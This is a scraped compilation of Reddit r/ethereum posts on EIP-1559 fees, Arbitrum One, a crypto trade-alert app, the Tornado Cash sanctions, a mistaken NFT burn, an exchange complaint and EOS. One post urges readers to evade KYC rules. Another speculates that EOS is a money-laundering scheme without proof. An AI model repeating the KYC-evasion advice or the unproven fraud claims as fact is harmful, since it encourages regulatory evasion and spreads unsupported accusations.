[here](https://docs.google.com/spreadsheets/d/1iid0PnO5UTMECW2RylVwEOECFbW5iWsJSHmP4zj7Lr4/edit?usp=sharing).### Status quo:(https://storage.googleapis.com/ethereum-hackmd/upload_3275cf10d6874f0837b08b17160231ee.png)### EIP 1559:(https://storage.googleapis.com/ethereum-hackmd/upload_a5b82e76e3e6820dbd6e1d117f034e17.png)## What would EIP 1559 do under larger and more prolonged spikes (eg. day-long spikes)Not much. The BASEFEE would rise and there would be a short period at the beginning where a few transactions get in faster, but after that the fee market would function just as it would under &#34;ordinary&#34; conditions, just at a higher fee level. The main benefit of EIP 1559 in spikes is that the harms from inefficiency of regular fee markets are magnified when fees are high, so having a functioning fee market becomes more important.## If the chain _can_ handle 2x block size spikes, doesn&#39;t that mean the chain can handle just making _all_ blocks 2x larger?No. See this post for why:https://notes.ethereum.org/@vbuterin/eip_1559_spikes## Why limit = target * 2? Why not 4? Or 8?It could easily be higher than 2. The higher the limit/target ratio the greater the fee market efficiency benefits of EIP 1559. It depends on how  severe the short term spikes are that we are willing to accept; 2x is fairly conservative. We could even launch EIP 1559 with a limit/target of 2 to start off, and increase it over time as we see the network functioning okay even under short-term spikes.## Why would miners include transactions at all?The EIP includes a &#34;tip&#34; that transaction senders can include, that goes to the miner. The tip has two functions: first, if there are suddenly far more transactions than expected, miners will include transactions with higher tips first, so the fee-based prioritization mechanism exists as a backup. Second, it compensates miners for uncle risk (the increased risk their block will not be included in the main chain because adding one more transaction will slow it down).The tip level that compensates for uncle risk has been calculated to be about 0.8 gwei (uncle blocks get on average a 1.67 ETH reward instead of the 2 ETH base, so that&#39;s a ~0.33 ETH = 330m gwei loss, 10 million gas blocks add ~0.025 to the uncle rate ckompared to empty blocks, so the expected cost of 1 gas is = 330m / 10m * 0.025 = 0.825 gwei) and miners do actually set about this value when the chain is empty.This tip level is independent of the BASEFEE, so client implementations can confidently set 1-1.5 gwei and expect their transactions to be accepted.## How might wallets choose tips? Is there a risk of bidding wars for tips?Wallets could simply choose tips by looking at what tips have been accepted on chain historically, and increasing their tip if they see that a transaction they send was not accepted immediately. Note that in &#34;normal conditions&#34; there is no incentive to set a tip higher than the bare minimum.In cases of sudden congestion, tips _do_ degrade into a bidding war; wallets can detect congestion, and in this case they could offer users the option of setting low or high priority for their transaction.## What is the escalator mechanism? How might the escalator mechanism be combined with EIP 1559?The escalator mechanism is a different proposed transaction fee reform, where instead of specifying a single fee, users specify their fee as a function, usually with a beginning, an increase-per-block and a maximum, for example &#34;5 gwei if this transaction is included in block 10123456, add 1 gwei for every block after that (eg. 8 gwei if included in block 10123459), up to a maximum of 100 gwei&#34;.This would be four parameters: beginning fee, beginning block, per-block increment, max fee.The goal is to be &#34;safer&#34; against mistakes in fee estimation, as if the fee turns out to be too low it would naturally rise over time until the transaction is included. In an EIP 1559 context, this could be used to set the tip. The fact that the tip would generally be in a constant range means that even a wallet using fixed parameters for the escalator would deliver reasonably good outcomes to users.## Won&#39;t miners have the incentive to collude to push down the BASEFEE by making all their blocks less than half full?In general, the effectiveness of such strategies is limited, because unless truly almost everyone colludes, a transaction not included in one block will get included will just get included in the next block and so the effect of this action on the long-run BASEFEE will be negligible.However, what miners _can_ do is a kind of &#34;monopoly pricing&#34;. Suppose transaction senders are willing to pay some extra fee to avoid getting delayed one block. Miners can refuse to include transactions that do not include some minimum tip `T`; they lose out on some fee revenue, but gain from senders increasing their fees if they value the extra probability you will be the next miner and include their transaction highly enough. This strategy is heavily tilted against the miner: they suffer the full cost of lost fee revenue, but gain only a small portion of the increased transaction fees that others send.Note that even if a miner using such a strategy is successful, they will increase other miners&#39; revenue more than it will increase their own revenue (as other miners free-ride on the higher tips due to your actions), so it is not a centralization vector.This will _not_ reduce BASEFEEs down to zero; rather, it will hit an equilibrium where BASEFEEs remain the bulk of the fee and tips take up the remainder. This is because unless miners are all colluding (in which case we have bigger problems), miners suffer the entire cost of not including transactions but gain only some of the benefit of tips being higher.**If the risk of miners deploying such a strategy is _still_ deemed unacceptably high, we can direct some (eg. 50%) of the revenue from EIP 1559 into a pool from which a small percentage is drained every block to be added to the miners&#39; block reward**; this ensures miners benefit from the BASEFEE being high, further reducing the gains from such an attack.Here is a proposed sketch of a change to the EIP to do this:* Define the account 0x35 as `FEE_SMOOTHING_BUFFER`, and define `FEE_SMOOTHING_CONSTANT = 8192`* Add an additional term to the block reward (added at the same time as the base block reward and uncle+nephew rewards). Let `smoothing_reward = FEE_SMOOTHING_BUFFER.balance // FEE_SMOOTHING_CONSTANT`. Transfer `smoothing_reward` wei from `FEE_SMOOTHING_BUFFER` to `block.coinbase`* After applying the block rewards, 1/2 of EIP-1559 fees from that block (rounding down) get added to `FEE_SMOOTHING_BUFFER`&#39;s balance. The remainder (ie. 1/2 rounding up) gets burned.Note that in a proof of stake context, it would be desirable to implement secret leader elections along with penalties for early revelation, to prevent validators from acquiring reputations as only accepting high tips and gaining the entire benefit of this themselves as transaction senders would know which validators are creating blocks soon.### Other resources* The original paper: https://ethresear.ch/t/first-and-second-price-auctions-and-improved-transaction-fee-markets/2410* ethresear.ch thread on Barnabe&#39;s simulations: https://ethresear.ch/t/eip-1559-simulations/7280* Tim Roughgarden&#39;s report: http://timroughgarden.org/papers/eip1559.pdf",False,"This is why EIP 1559 is good- and why Vitalik, developers and most community members support it.

Let's have a bit of an adventure and find out why shall we?Today, 40&#37; of the ethereum's network is being used by this contract [https://etherscan.io/address/0x98b4ca8bd52e4ed1f28d3f30d9f567d1166c9483](https://etherscan.io/address/0x98b4ca8bd52e4ed1f28d3f30d9f567d1166c9483) A beautiful and innovative copy-paste of a default ERC20 standard token called 'IFishYunYu' with no features. (So it does nothing.)Yet miraculously, it seems tons of 'unique' accounts are transferring massive volumes of this token constantly, almost 50 ETH of gas an hour have been steadily used for nearly 24 hours now. Just to transfer individual tokens to the Fcoin exchange. But of course. The exchange is just a red herring to distract you from what's really happening.Let's see what the creator of this contract has been up to recently. [https://etherscan.io/tx/0xd0e334dca734071f395cad64df90269113ead321232e5603f66fc6fb2885c654](https://etherscan.io/tx/0xd0e334dca734071f395cad64df90269113ead321232e5603f66fc6fb2885c654) Looks like he minted nearly 5 Billion Ifish tokens about 12 days ago... to this account 0x45f64a7148d1cfeded427dd4380b458877e7ce56 which split it up across 10 or so accounts, that each do this [https://etherscan.io/token/0x98b4ca8bd52e4ed1f28d3f30d9f567d1166c9483?a=0xcd4777b5f4d8779e99ea996bb32988daf0bbbf3b](https://etherscan.io/token/0x98b4ca8bd52e4ed1f28d3f30d9f567d1166c9483?a=0xcd4777b5f4d8779e99ea996bb32988daf0bbbf3b) splitting it up across 500-600 accounts each.Which are, the mystery 'unique' accounts that are spamming the eth network. So yeah, it's one guy, it's the creator of the token. He was doing it during the previous Fcoin exchange competition too. He's running a multi-sided scheme, he even has bots running 'wash' accounts. Like [https://etherscan.io/address/0xa67ef2aca4c6459e60821c1b1afe45812c4c1bcd#tokentxns](https://etherscan.io/address/0xa67ef2aca4c6459e60821c1b1afe45812c4c1bcd#tokentxns) which is pretty cool, it just shoves the token into other accounts, and then those accounts shove it into other accounts, and then back to the big main account to simulate volume on the token itself. Try following a transaction, you'll come right back to the big-daddy account.most importantly on why is this being done? Let's see what one of the accounts funding all this eth might be doing [https://etherscan.io/token/0x86fa049857e0209aa7d9e616f7eb3b3b78ecfdb0?a=0x7a717e226a8b37b912d0effbb0aab24ab690dbdb](https://etherscan.io/token/0x86fa049857e0209aa7d9e616f7eb3b3b78ecfdb0?a=0x7a717e226a8b37b912d0effbb0aab24ab690dbdb) gee, that sure is a lot of crowdfunded EOS, hundreds of thousands to be exact. From an account that seems to receive large sums of eos and immediately market sell them for thousands of ETH, which is then distributed out to contracts like this.

Bridging instructions here:  [Arbitrum Bridge](https://bridge.arbitrum.io/) Arbitrum One, in my opinion, is the most important smart contract platform release since Ethereum in 2015. Here are some details.**What is Arbitrum One?**Arbitrum One is a smart contract chain. It's just like Ethereum, has similar security properties to Ethereum, except it's much faster and cheaper.If you want to dive into the technical details, Arbitrum One is an optimistic rollup. Here's a [great video explaining how optimistic rollups work](https://www.youtube.com/watch?v=7pWxCklcNsU). For an even deeper dive, see [Inside Arbitrum](https://developer.offchainlabs.com/docs/inside_arbitrum). For the normie user, this doesn't matter. All you need to know is it's a faster and cheaper version of Ethereum.**What's the difference between Arbitrum and Arbitrum One?**Arbitrum is the brand, Arbitrum One is a specific rollup chain. Reddit will have their own chain using Arbitrum technology.**How fast is Arbitrum One?**Transactions confirm within a second, so as close to instant as you can get! Really, most of this is latency is between your internet connection and Arbitrum One.**How cheap is Arbitrum One?**Gas fees will be anywhere typically between 90%-95% cheaper than Ethereum. So, if a transaction costs $20 on Ethereum, it'll cost anywhere between $0.40 and $2 on Arbitrum One. The exact number will depend on the type of transaction and the gas prices on Ethereum. As Arbitrum One matures, fees will lower over time.**Boo! That's not cheap enough!**I hear you. While 90+% cheaper than Ethereum is a tremendous improvement, and will be cheap enough for many, many more users, it's not enough for everyone.Some may be wanting transaction fees in the $0.01 range. This will happen as Arbitrum One matures, and data shards release on Ethereum. It'll take a couple of years to realize the vision for global scale.In the here and now, you'll have to use a sidechain like Polygon PoS - but be aware that it's far, far less secure or decentralized than Arbitrum One or Ethereum, so what you save in fees, you pay for in security. We will also see intermediate solutions over the coming months like validiums e.g. zkPorter and Immutable X, which offer sidechain-like fees, but far better security.**When can I use Arbitrum One?**August 31st!**How do I use Arbitrum One?**The same way use Ethereum! If you have used Ethereum sidechains like Binance Smart Chain, Polygon PoS, or Avalanche, you'll know exactly how this works.The [Arbitrum One Portal](https://portal.arbitrum.one/) will be a great place to get started.Go to [Arbitrum (ETH) Blockchain Explorer (arbiscan.io)](https://arbiscan.io/) '- which is the Etherscan for Arbitrum. At the bottom, you'll see 'Add Arbitrum Network'. This will add Arbitrum One to the web3 wallet of your choice (e.g. MetaMask). From there, you use the same address as you do on Ethereum, the same wallets, same everything.Alternatively, the web UIs for your favourite dApps will also likely have options to switch to Arbitrum. For example, [Uniswap has a guide for Optimism, something very similar will be live for Arbitrum One too](https://help.uniswap.org/en/collections/3033942-layer-2).**How do I send my tokens to Arbitrum One?**You can bridge your tokens to Arbitrum One using the [default gateway](https://bridge.arbitrum.io/).In addition, you will have multiple liquidity bridges like Hop Protocol, Celer cBridge, Connext and Biconomy that will not only allow you to bridge tokens between Ethereum, but also other chains like Polygon, Optimistic Ethereum etc.Furthermore, major CEXs like OKEx, Huobi and Coinbase have committed to offer direct withdrawals to Arbitrum One. So, you'll never have to use Ethereum and can totally bypass the high fees there! Of course, it'll take some time for all of this infrastructure to mature, but it's happening.**What can I use on Arbitrum One?**One of the reasons I call Arbitrum One the most important smart contract chain release since Ethereum is because of its [expansive developer adoption](https://www.reddit.com/r/ethereum/comments/p4qanm/arbitrum_one_has_the_greatest_developer_adoption/). Most of the bluechip projects - Uniswap, Chainlink, Maker, Aave, Curve - you'll find them on Arbitrum One from day 1! There are over 400 projects set to release on Arbitrum One, with many more live over the coming weeks. Nowhere will you see such a vibrant ecosystem of top tier dApps outside of Ethereum itself.**How do I pay fees on Arbitrum One?**You pay fees in ETH! No friction, no needing to buy a random token to pay fees.**OK, sounds good, but I can't find Arbitrum on Coingecko?**Arbitrum does not have a token. You just use ETH. I presume this is why it's so underhyped and underrated.**What are the caveats?**Long term, there's only one major caveat - withdrawing your tokens from Arbitrum back to Ethereum takes 7 days. However, you can easily use the liquidity bridges or CEXs to withdraw instantly. It's not suitable for NFTs, though - we'll see NFTs adopted on zkRollups like zkSync, Immutable X and Loopring instead which don't have this caveat. In the future, I expect Arbitrum will also offer zkRollup solutions.Short term, there are many caveats that you must be aware of. Arbitrum One is launching with multiple training wheels - there are multiple centralized aspects to Arbitrum One, chiefly upgradable L1 contracts and centralized sequencer. It's also cutting-edge tech, and there may be bugs and vulnerabilities. Only ape in with money you're willing to lose. However, all of these will be mitigated in the coming months as Arbitrum's top priority is progressive decentralization and general protocol maturity.Bonus questions:**What if Arbitrum One is congested?** (b**y** u/newtosh, u/fiah84)Arbitrum One uses an EIP-1559-like mechanism, where the transaction fees will start rising if it gets congested.**Running another fast chain like Arbitrum One can't be very cheap, do you know how offchain labs plans to monetize it?** (by u/fiah84)When Arbitrum One scales past Ethereum, it'll definitely be much more expensive to run an Arbitrum One node than Ethereum. Fortunately, because it leverages Ethereum's security, it's acceptable for Arbitrum One to be more expensive as you need much fewer nodes running (one honest sequencer and one honest validator is enough, but for resilience there'll be a few dozen, instead of thousands). End users can always verify directly from Ethereum - as all the transaction data is present in compressed form. Long-term, they can also use techniques like state expiry / regenesis to keep their nodes running efficiently - there's always a fallback state available for reconstruction from Ethereum.As for monetization, when you pay transaction fees on Arbitrum, a portion of it goes to Arbitrum, the rest is paid to Ethereum for security and data availability. That's how the network monetizes itself. Also, I'll note that Offchain Labs are working on decentralizing Arbitrum One, so the transaction fees will go to the network - sequencers and validators, possibly even a treasury - not just Offchain Labs. The exact mechanism for how the revenues will be decided as the network decentralizes.**So fees will go to validators and other machines that help run the chain. Will it be possible to set up and run servers for profit and supporting the arbitrum chain?** (by u/pikag)For the first part, see above. Without going into too many details, yes, you'll be able to run sequencers once decentralized, though the details are pending. Also, there are validators, but these are specialized roles quite unlike validators on L1s. You can read about the [details here](https://developer.offchainlabs.com/docs/inside_arbitrum#validators).**Is this a centralized or decentralized solution? What happens when Arbitrum as an org, goes under?** (by u/benaffleks)In the short term, it's a semi-de/centralized solution. However, this is entirely due to it being brand new tech, and training wheels required.Offchain Labs is focused on progressive decentralization, so in the future, it'll be a fully decentralized solution. Even if Arbitrum One fails, as a decentralized solution, you can still exit with your funds directly from Ethereum L1 - this is why we say it's materially as secure as Ethereum.**Given that the sequencer will be centralized at release, isn't there a risk that Arbitrum do not process certain transactions like withdrawals and your funds get stuck?** (by u/ZougTheBest)Different rollups have different exit mechanisms if the sequencer censors you. Arbitrum was initially designed without a sequencer model - it was actually one of the last things to be added. As a result, Arbitrum has one of the simplest ways to exit: you can bypass the sequencer and submit your transactions [directly to the regular inbox](https://developer.offchainlabs.com/docs/inside_arbitrum#if-the-sequencer-is-malicious).**Can you build a rollup on top of a rollup? Could this make cheaper transactions in case sharding never happens?** (u/Datacruncha)No, but you can have multiple rollups in parallel. There's a reason why it's called Arbitrum **One**! Indeed, next up will be Arbitrum Reddit - or whatever they call it. This won't reduce transaction fees significantly overall. What will is massively greater data availability on Ethereum when data shards release, as covered above.**With all these rollups competing there is going to be fractured liquidity among them right? Any solution to this? (by** u/Phenozd)Yes, but in reality, the situation is nuanced. The lower fees and higher transaction throughput will simply onboard new users and new liquidity that didn't exist before, so it's a net gain. Multiple projects are working hard on interoperability between rollups, and we have brilliant solutions like [dAMM](https://medium.com/starkware/damm-decentralized-amm-59b329fb4cc3) being developed that lets zkRollups share liquidity! Note: dAMM won't work with Arbitrum One - only zkRs.'---If there are any more questions, feel free to ask, I'll add them in here to the best of my knowledge! I am not affiliated with Offchain Labs and Arbitrum in any way, so please correct me if I'm wrong anywhere.PS: Everything I write is in the public domain - feel free to share, repost, adapt as you please.

A bunch of my coworkers who were also into trading cryptocurrency on GDAX really wanted to use it so initially I was just giving them the code but then I decided that since i've always wanted to have an app under my name on the App Store and learn Swift, this would be the perfect opportunity.I have all of the code publicly visible on my Github [HERE!](https://github.com/leggio/CoinTradeAlerts) The backend API is a flask web server running on an AWS EC2 Instance. The Database is an AWS RDS MySQL database. I've been using Flask for about 2 years and I never really thought that it could be practical for iOS development. It really surprised me how well it worked.______________________________________________________________________________Although my code is publicly visible and I am only reading your completed orders, there is obviously a trust level required on your end to give me the API key. Nobody here knows who I am and I fully understand that!**If you provide anything more than VIEW ONLY your API key CAN be used to transfer your money/coins and steal them.**If anyone does not feel comfortable doing so, you are more than welcome to use [the previous version](https://raw.githubusercontent.com/leggio/Cryptocurrency/master/Fill_Tracker.py) of this code and run it locally on your machine. This means that you are entering your API credentials locally on your own machine.I am in the process of building out the website, which will include instructions as to how to do the above, as well as provide the same (and more!) functionality that the app does. The website should come out with the base features in a few days and will allow people who don't have iPhones to utilize this tool!______________________________________________________________________________**I originally posted about this on /r/litecoin and /r/bitcoin yesterday and received such overwhelming support that it was crashing the backend web server of my application. Today I was able to get this sorted out and nobody should experience any problems!**______________________________________________________________________________Additionally, I received a lot of great feedback from you guys, which is why I spent quite a few hours yesterday/today building a brand new website that will offer the exact same functionality as the mobile app, but in your browser! I plan on deploying in the days to come. I will be adding all user requests to the website as well.What's currently on my todo list: 1) Security alerts! I had a phenomenal request from /u//swingvitamin to set up alerts when transfers/instant purchases are made on your account to try and combat account theft. I think this was an awesome idea and I will be working to bring this out ASAP!",False,"Had a 2 week gap between my last job and my new job so I made it a goal to learn iOS development and get an app published on the App Store, thus Coin Trade Alerts was born",,0,782,0.91,https://www.reddit.com/r/ethereum/comments/7njsnq/had_a_2_week_gap_between_my_last_job_and_my_new/,[]

It's the first time that the US directly attacks a smart contract.With their actions they have demonstrated that they know better our vulnerabilities than what we thought. But this demonstration of power can teach us how they are going to proceed in future attacks, which for sure are going to come as the Ethereum network starts taking away a big share of the financial system.From the experience of this attack we can see that the principal point of failure in the current system is all of the non-decentralized platforms and protocols that are not required but essential to make the network work. I'm going to enumerate them and some possible solutions to the problems:* **RPC's**: it doesn't make sense to have a 100% decentralized system if the channel that you use to connect to it is 100% centralized. We need to start using by default in our wallets decentralized RPC's. Unfortunately this is not easy, as running a full node requires a lot of hardware requirements. Fortunately we'll soon have light clients which will enable us to query and validate the network with little resources.* **DNS**: dapp's must have a frontend deployed on IPFS (with a decentralized pinning service like Filecoin) accessible with a .eth domain. But this is not enough! as currently the DNS translation is done using centralized RPC's. When light clients are available, browsers will need to use them as the default DNS resolver.* **GitHub:** I wouldn't have ever imagined that this could pose a threat to Ethereum security but as we saw it's a significant point of failure. **All the DAPP's code must be always accessible** in a decentralized, global, searchable place, with a nice UI to interact with it. Currently there are two projects aiming at solving this problem: [radicle](https://radicle.xyz/) and gitopia.* **USDC/TETHER:** we already knew this but it is good to remember the risk that this kind of stablecoins generate. Fully decentralized stablecoins don't exist, but DAI and FRAX are a significantly better option as not 100% of its collateral comes from assets outside of the chain.* **Metamask:** there has not been any problem with it, but as a closed source software and critical part of most of the Ethereum transaction we should take it into consideration. A project aiming to solve this problem is [tally](https://tally.cash/), they are fully open source and they have a DAO, although their product doesn't have as many features as Metamask yet.* [**localcryptos**](https://localcryptos.com/) **> Coinbase:** last but not least. Even if all the previous measures are implemented correctly it is going to be of no use if the government prohibits citizens from using a dapp. Wallets should be anonymous from the first time that users get into crypto so the government can't impose their regulations on the users, so stay anonymous and evade KYC.And that's all, hopefully with measures like this and more that will come we'll be able to build a better future.A developer.&#x200B;Full article: [https://medium.com/@pabloturnes/the-tornado-cash-opportunity-3a65d5f231cf](https://medium.com/@pabloturnes/the-tornado-cash-opportunity-3a65d5f231cf)",False,The tornado cash opportunity.

Today we are deploying a new Layer-2 rollup using Arbitrum technology. We will be testing this scaling network on top of Rinkeby, before migrating to the Ethereum mainnet.**'*'*'*Hello Ethereum world! Last year, we launched [Community Points](http://reddit.com/community-points) – tokens on Ethereum that give more ownership and control back to users through decentralized technology. Soon after, we invited the crypto community to a [Scaling Bake-Off](https://www.reddit.com/r/ethereum/comments/hbjx25/the_great_reddit_scaling_bakeoff/) to help figure out how to bring Community Points to the Ethereum mainnet. As we evolve these efforts, we're continuing to work towards our commitment to blockchain, helping to accelerate scaling and resources for the Ethereum ecosystem and bringing the value and independence of blockchain technology to more communities and millions of redditors.  Now onto the exciting Bake-Off news...we were deeply impressed by the breadth and quality of the projects that participated in the competition. Thanks to all your hard work, there has never been a more exciting time to be building on Ethereum!After significant research and in-depth reviews of multiple projects, we found [Arbitrum](http://arbitrum.io/)'s optimistic rollups to be the most promising scaling technology for Community Points. Today, we are launching our own Layer-2 rollup using Arbitrum technology. We will be testing this scaling network on top of Rinkeby, before migrating to the Ethereum mainnet.As we did our research, it was clear that different scaling solutions fit different needs. For us, there are multiple features that make Arbitrum stand out:* **It's decentralized.** Arbitrum derives its security and finality from the base chain. No centralized actors or bridges, which means users are always the ones in control of their Community Points and other blockchain assets, not anyone else.* **It's developer-friendly.** Arbitrum supports the same Solidity smart contracts and the same toolchain as Ethereum. Developers can launch apps on top of Community Points on this network as easily as they can on Ethereum.* **It has broad ecosystem support.** [Many](https://twitter.com/haydenzadams/status/1397675095708086273?s=20) [large](https://twitter.com/chainlink/status/1398438140969377792) [projects](https://offchain.medium.com/etherscan-is-coming-to-arbitrum-4f41edaff100) are launching on Arbitrum, outside of us. A big ecosystem brings together the tools and infrastructure to keep things growing even further.We have been working closely with [Offchain Labs](https://offchainlabs.com/), the team behind Arbitrum, and we are excited to take our collaboration to the next level. We've been impressed by the quality of their work, the maturity and thoughtfulness of the team, and the progress they've made on bringing optimistic rollups to production. We look forward to continuing to work with them and the [Ethereum Foundation](https://www.reddit.com/r/ethereum/comments/l6c3kx/reddit_announces_partnership_with_the_ethereum/) to bring Ethereum to Reddit-scale production in ways that will benefit the entire ecosystem.Today's launch is a big step forward, but our work is far from done. Our goal is to cross the chasm to mainstream adoption by bringing millions of users to blockchain. If you are a top-notch engineer who wants to build a more decentralized Internet at Reddit-level scale, we [want to work with you](https://boards.greenhouse.io/reddit/jobs/2790178)!

I was delighted to see that Emblem Finance had found a way to create vaults to allow trading of these old BTC assets on openseaI jumped on board and filled one vault with an entire set of cards.  It's the only full set available on Opensea that I know of.    I did a second vault with only 4 cards, including a satoshicard and an FDcard- two of the rarest cards in existence, and listed them for sale.  HOWEVER-  In the description of the second vault, I listed some erroneous information about FDcard, stating that it was not divisible like the Satoshicard.  This drove me crazy, so I decided to claim that vault, take out the cards, and create another vault with the accurate information.  So I created the second vault, but then once it was created I noticed there was a small grammatical error (I repeated a phrase).  I hadn't put any cards in it yet, and the error bothered me, so I decided to just send that vault to the burn address and do it again.  So I did.  I then created the third vault, and got the text just how I wanted.  Then I went to fill this new vault with the cards, and this is where I F'*'*ed up.  I apparently still had the tab open on emblem finance for the burned vault, and I took the BTC address from that one rather than the newest one.  Each card that I sent I checked and rechecked to make sure the address matched, which it did... but the vault was in the burn address.  So I sent away-  a Satoshicard, an FDcard, a Satoshilite, and and Ethereumcard.  One by one the transactions confirmed.  And my vault remained empty.  Refresh refresh refresh.... nothing.  It must be a bug, I said.  But then I pulled up the address on the counterparty explorer, and all 4 cards were there.  And then the possibility of the worst case scenario leaked into my brain, and I rejected it.  I had triple checked!  But, I looked at the burn address account on opensea, and there it was.  'My' vault, and 'my' cards.[Here they are](https://opensea.io/assets/0x82c7a8f707110f5fbb16184a5933e9f78a34c6ab/31233817437325701) if anyone wishes to pay their respects.  'Fewer complete cards complete cards....'  They have now been sacrificed to the Gods of Stupidity.  I'm very happy that it was the 4 set rather than the full set.  I can only look on the bright side and realize that there are now 198 Satoshicards and 299 FDcards in existence, so my other cards are more rare.  And maybe I have a tax writeoff?

I exchanged 0.1 ETH into BTC, and it worked.It seems legit, so I tried exchanging 12 ETH into BTC using CoinSwitch. I waited for awhile, and then the order failed. My 12 ETH gone!CoinSwitch told me to create a ticket to contact the support team, and I still got no response from them. I just lost my ETH and my money.Tip for anyone: DO NOT USE COINSWITCH!!! DO NOT TRUST COINSWITCH!!!If anyone else has had this experience, or knows how to report coinswitch, please let me know!**UPDATE:  01/16/2021**I did not expect to get this much support from this community.First, I would like to say that I appreciate everyone's feedback. I've read a lot comments that gave me good tips and telling me the correct way to switch coins.I'm very new to the cryptoworld, and I'm still learning along as I go.I've learned a lesson today: DO YOUR RESEARCH! I naively transact my coins to a company that's not very trustworthy which I wasn't aware of before. A quick google search could've helped me a lot.I've learned my mistake and never make the same again! You live and you learn.I haven't got a reply yet from the support team or didn't got a refund yet.I'll update this post when things change. Thank you!**UPDATE: 0/1/17/2021**I finally got my money back! It took a week to get it back.

Massive amounts of ether sent daily from wallets that only interact with EOS contract---This was the first sign that tipped me off. The following accounts are sending hundreds of thousands of dollars to EOS every week. These accounts look like they were created before the contract and have only been used to buy from the contract, then send the funds to different exchanges. (There are plenty more, these are just the accounts I found within the last 10 pages and the first 2 pages of the Contract)* https://etherscan.io/txs?a=0x1ecf0b798ebb43477b5c657963332d640871a0ec&p=1* https://etherscan.io/address/0x2808c13b7b81c6fdcfb10ed6f158b84a3284d68f* https://etherscan.io/address/0x1869e05f92ba2e0d71e9da71713c8672a18ea923* https://etherscan.io/address/0x4e8c49fab23532ef2ed14058639f55cf45bade1e* https://etherscan.io/address/0x720081be885c6c0de4d1c7f8ed0e3b284010e20b* https://etherscan.io/txs?a=0x3d4211b8fd39b1fecafb27f707b23dc36b7e18bc&p=9* https://etherscan.io/txs?a=0x1ecf0b798ebb43477b5c657963332d640871a0ec&p=1All of these accounts ONLY interact with the EOS contract, they get funds from exchanges, and immediately send the EOS off to the exchange. ---2.The 1 Billion Dollar ICO---More like 1 Billion dollar money laundering scheme. We all know the creator of EOS has been in the crypto world for a very long time and as such has a lot of BTC and ETH, BTS, and all his other coins he has made during his time. Let me lay out a scenario for you and you tell me what you think:1. Start ICO with unlimited cap2. Funnel existing cryptos into your own ICO3. Get your funds back....since you own the ICO4. Get Tokens as well5. Sell Tokens6. Send BTC/ETH from tokens you just sold back to get more tokens7. Repeat at step 2. This scheme can go on forever, or until the token your buying goes to 0.00. Yet EOS is currently .60 cents. Meaning if I owned the contract, I can continually send money and create more money out of thin air. ICOs are capped - not because its 'normal' but because it prevents fraud. If you don't cap the crowdsale, there is no prevention against fraud. Even with a capped crowdsale there is a chance of fraud, but its economically less viable the more you do it.This is why other ICOs are not considered money laundering, there will be a point where your just buying your own tokens and its pointless. But if its uncapped, as long as the token has ANY market value (even .000001 cents) you can still make a profit doing this fraud. This is why ICO limit the amount of money they are bringing in, because if they did not set caps, there would be no way in knowing if the company bought all of their tokens themselves, or if it was a genuine firesale. While it may not be the case that EOS are COMPLETELY a money laundering operation, I see this as a very high statistical probability. Maybe they are not running the EOS sale with 100% intentions for laundering all their crypto, but it is definitely taking place. This is proven by the fact that there are accounts that were created around the tme of the creation of the EOS contract and ONLY interact with that contract. Can someone who has more capabilities than me, please look into this? These are accounts created only for EOS contract buys, the tokens are constantly been moved, if there are rumors that the creator is a scam artist within the community, so should the SEC/FBI be involved here? Also can someone explain the interactions that are going on between 0x000000... address and the others? Why does a null/dev/orginial address have so many ICO tokens and is constantly active? EDIT: Not trying to spread fud or make any claims, I'm just bring attention to what I found and hope someone can explain it, I don't own, nor will I ever own any EOS tokens. I just actually want answers. If anyone has information that I am missing, please share it! I'm hoping I'm wrong!

The first to come with a solution was a Russian-Canadian developer Vitalik Buterin, who submitted the Ethereum concept to the crypto community in late 2013. After a successful crowdfunding in 2014 the platform went live by July 2015.The major innovation of Ethereum that distinguished it from Bitcoin was a wide range of possible **smart contracts** that could be coded on its blockchain. A smart contract is basically a computer program registered on a blockchain that is executed by the EVM (Ethereum Virtual Machine) when a transaction is sent to its address; the results of a program execution are themselves being stored on a blockchain. The **DApps** (decentralized applications) using these smart contracts enjoy all security and independence benefits of a blockchain: program execution is entrusted to a decentralized network instead of a single third party.## Ethereum consensus and feesIn order to incentivize Ethereum nodes to run smart contracts, fees are paid for every transaction. **These fees are paid in a special unit called gas and depend on the amount of computations to be done**. Gas can be bought with Ethereum native currency Ether (ETH), the price being decided by the market according to the supply/demand ratio. Ethereum uses a Proof-of-Work consensus, like Bitcoin, although it has some specificities of its own: hashing function is Ethash and a block is added every 15 seconds. Ethers are generated as a miner's reward for adding a block, however there's no hard cap on their total emission. Current yearly network issuance is approximately 4.5%, and will be reduced with ETH 2.0## Ethereum tokensEthereum is also a very convenient platform for the creation of tokens - digital units circulating on a blockchain and representing a certain value assigned to them by their creator. Its **ERC20** (fungible) and **ERC721** (non-fungible) tokens have become the standards in the industry and are being used extensively.## DAOEthereum can be used to build Decentralized Autonomous Organizations (DAO). A **DAO is an organization with governance defined by smart contracts registered on a blockchain**. A DAO allows a group of persons to interact using an open source protocol with auto-executing qualities; this protocol and the associated smart contracts formalize the organisation's operation rules. Once deployed, a DAO is independent from its creator and isn't controlled by an entity, but rather by a consensus between its participants, according to its blockchain-registered code. The owners of tokens associated with a DAO are assigned voting rights and are often rewarded for their participation in the DAO's governance.The transparency and immutability of the blockchain make such organizations difficult to corrupt, proposing an alternative model to centralized organizations. There are lots of DAO in the DeFi (Decentralized Finance), the most famous being Maker DAO - a lending platform managing the dollar-pegged stablecoin DAI.## ETH 2.0 and Casper Ethereum relying on a PoW consensus, it has its standard disadvantages: the blockchain is rather slow, costly and energy consuming. To overcome these drawbacks an important update has been planned since Ethereum conception: initially called Serenity and now mostly referred to as **ETH 2.0**, this update has been released in December 2020. It has been deployed on a parallel chain first, in order to conduct all the necessary tests before becoming the main Ethereum chain.ETH 2.0 relies on a consensus called **Casper**, which is a version of the PoS consensus: validator nodes stake a minimum amount of 32 ETH to be able to propose a block or to validate it. The new consensus would also improve the blockchain's scalability, allowing a blocktime of just a couple of seconds.ETH 2.0 will also affect the annual Ether emission rate, which will be significantly decreased, or even become negative.## Ethereum todayEthereum is the most popular blockchain for DApps development, with over 5000 DApps built on it. It is a major blockchain for the Decentralized Finance, or DeFi, with an important new metrics - TVL (Total Value Locked), representing the collateral locked in different types of DeFi applications - exceeding $50 BN worth of crypotoassets. ETH 2.0 is a major ambition for Vitalik Buterin. According to the Ethereum creator, the 4 major problems that need to be solved to push Ethereum to the next level are privacy, consensus safety, smart contract safety, and  scalability. Some would add a governance issue to the list, for its role in blockchain's life is crucial.

